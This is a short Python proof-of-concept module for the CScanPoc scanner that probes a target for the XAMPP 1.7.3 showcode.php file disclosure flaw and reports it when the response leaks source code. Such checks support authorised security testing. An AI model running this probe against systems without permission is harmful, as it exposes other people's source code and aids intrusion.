# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'XAMPP_0006' # 平台漏洞编号，留空
    name = 'XAMPP 1.7.3 文件泄露漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = ' 2010-11-01'  # 漏洞公布时间
    desc = '''
        XAMPP 1.7.3 /xampp/showcode.php/showcode.php?showcode=1 文件泄露漏。
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/15370/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'XAMPP'  # 漏洞应用名称
    product_version = '<= 1.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8687ebd4-ccfc-475f-9509-b874ef19e160'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/xampp/showcode.php/showcode.php?showcode=1"
            code, head, res, errcode,finalurl =  hh.http(url)
            if res.find('file_get_contents') != -1 :
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()